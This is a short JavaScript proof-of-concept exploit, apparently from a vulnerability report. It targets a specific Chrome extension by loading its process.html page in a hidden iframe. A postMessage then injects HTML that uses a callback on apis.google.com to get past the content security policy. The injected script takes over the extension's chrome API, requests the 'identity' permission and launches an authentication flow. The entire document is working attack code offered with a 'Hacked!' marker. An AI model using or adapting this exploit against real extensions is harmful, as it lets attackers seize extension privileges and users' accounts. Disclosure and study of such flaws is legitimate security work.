let payload = `
alert("");
chrome = parent.chrome;

chrome.permissions.request({permissions:  ["identity"]}, (granted) => {
if (granted) {
chrome.identity.launchWebAuthFlow({url: "https://www.google.com", interactive: true}, (e) => {});
}
else {
alert("Error with granting permission: ", chrome.runtime.lastError).
}
})

`;

let frame = document.createElement("iframe");
frame.src = "chrome-extension://pnhplgjpclknigjpccbcnmicgcieojbh/process.html";
frame.style.display = "none";
frame.onload = () => {
  frame.contentWindow.postMessage(
    {
      type: "doc_html",
      html: `<b>Hacked!</b><iframe srcdoc="<script src='https://apis.google.com/js/api.js?onload=%22-(()=>{${encodeURIComponent(
        payload
      )}})()-%22'></script>"></iframe>`,
    },
    "*"
  );
};

document.body.appendChild(frame);
